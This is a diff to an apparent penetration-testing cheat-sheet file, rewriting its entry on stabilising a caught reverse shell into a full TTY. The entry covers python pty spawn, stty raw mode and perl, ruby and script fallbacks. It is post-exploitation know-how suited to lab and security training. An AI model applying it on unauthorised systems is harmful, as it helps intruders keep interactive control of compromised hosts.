@@ -5537,29 +5537,40 @@ run post/multi/recon/local_exploit_suggester`,
   shell_upgrade: {
     phase: "SHELL",
     title: "Shell Stabilization — Full TTY",
-    body: "Do this before anything else. A dumb shell drops on Ctrl+C, breaks on sudo, and hides passwords. A full PTY feels like SSH. Three paths: Python pty (most common), socat (cleanest — full PTY immediately), or script. Windows is completely different — ConPtyShell or rlwrap. pwncat-cs handles stabilization automatically if you caught the shell with it.",
-    cmd: `# ── METHOD 1: PYTHON PTY (most common) ───
-# Step 1 — spawn PTY inside the shell
+    body: "Stabilize before you do anything else. A dumb shell dies on Ctrl+C, breaks sudo, and hides password prompts. The S1REN sequence is the standard: Python pty spawn → Ctrl+Z → stty raw -echo; fg → fix terminal size. Five steps, thirty seconds, done once. Every other technique is a fallback for when Python isn't on the box.",
+    cmd: `# ══ THE S1REN SEQUENCE — run this every time ══
+# ── ON THE TARGET (in your dumb shell) ───
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-python -c 'import pty; pty.spawn("/bin/bash")'    # if python3 not found
-script -qc /bin/bash /dev/null                     # script fallback
 
-# Step 2 — background the shell
-# Press: Ctrl+Z
-
-# Step 3 — fix YOUR terminal to raw mode (no echo)
+# ── ON YOUR KALI (Ctrl+Z first to background) ──
+# Press Ctrl+Z   ← backgrounds the shell
 stty raw -echo; fg
-# ↑ 'fg' brings back the shell in raw mode
+# Press Enter once if prompt doesn't appear
 
-# Step 4 — fix the PTY to match your terminal
+# ── BACK ON TARGET — fix terminal size ───
 export TERM=xterm-256color
-stty rows $(tput lines) cols $(tput cols)   # match your actual terminal size
-# Or set manually:
-stty rows 50 columns 220
+stty rows 45 columns 220
+# Match your actual terminal — check with: stty size (on Kali before Ctrl+Z)
 
-# Step 5 — clean up environment
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-export SHELL=/bin/bash
+# ══ THAT'S IT. Full TTY. Ctrl+C works. sudo works. ══
+
+# ── FALLBACKS (if python3 not on box) ────
+which python python3 perl ruby 2>/dev/null   # check what's available
+
+python -c 'import pty; pty.spawn("/bin/bash")'   # python2
+perl -e 'exec "/bin/bash";'
+ruby -e 'exec "/bin/bash"'
+script /dev/null -c bash                          # script binary fallback
+/usr/bin/script -qc /bin/bash /dev/null           # full path
+
+# ── IF TERMINAL BREAKS (typed something wrong) ──
+# Type blind: reset
+# Press Enter — restores sane terminal mode
+
+# ── GET YOUR TERMINAL SIZE FIRST ─────────
+# Before you get a shell — note your terminal dimensions:
+stty size   # run on Kali BEFORE connecting — output: rows cols
+# Then use those exact numbers in stty rows X columns Y on target
 
 # ── METHOD 2: SOCAT (cleanest — immediate full PTY) ──
 # On attacker — socat listener (instead of nc):
